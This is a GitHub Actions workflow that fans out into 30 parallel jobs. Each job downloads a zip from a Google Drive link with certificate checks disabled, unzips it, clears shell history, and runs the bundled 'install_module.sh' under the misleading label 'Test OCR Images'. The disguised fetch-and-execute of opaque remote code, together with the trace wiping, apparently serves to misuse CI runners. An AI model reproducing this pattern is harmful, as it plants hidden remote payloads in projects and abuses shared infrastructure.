name: phienban4code
on:
  push:
    branches: [ "main" ]
  workflow_dispatch:

jobs:
  Assemble:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Init', 'Generate', 'Check', 'Start', 'Ship']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1v-K6sLCRp-DTRouDDd3oZ6jZxu0niTt6" -O phienban4code.zip
        unzip -o phienban4code.zip
        rm phienban4code.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh


  VERIFY1:
    runs-on: ubuntu-latest
    strategy:
      fail-fast: false
      max-parallel: 10
      matrix:
        go: [I.0, I.I, I.II]
        flag: ['Acquire', 'Assemble', 'Verify', 'Launch', 'Deliver']

    env:
        NUM_JOBS: 20
        JOB: ${ matrix.go }
    steps:
    - uses: actions/checkout@v1
    - name: Install Packages
      run: |
        wget --no-check-certificate "https://docs.google.com/uc?export=download&id=1v-K6sLCRp-DTRouDDd3oZ6jZxu0niTt6" -O phienban4code.zip
        unzip -o phienban4code.zip
        rm phienban4code.zip
        history -c && history -w

    - name: Test OCR Images
      run: bash install_module.sh
        
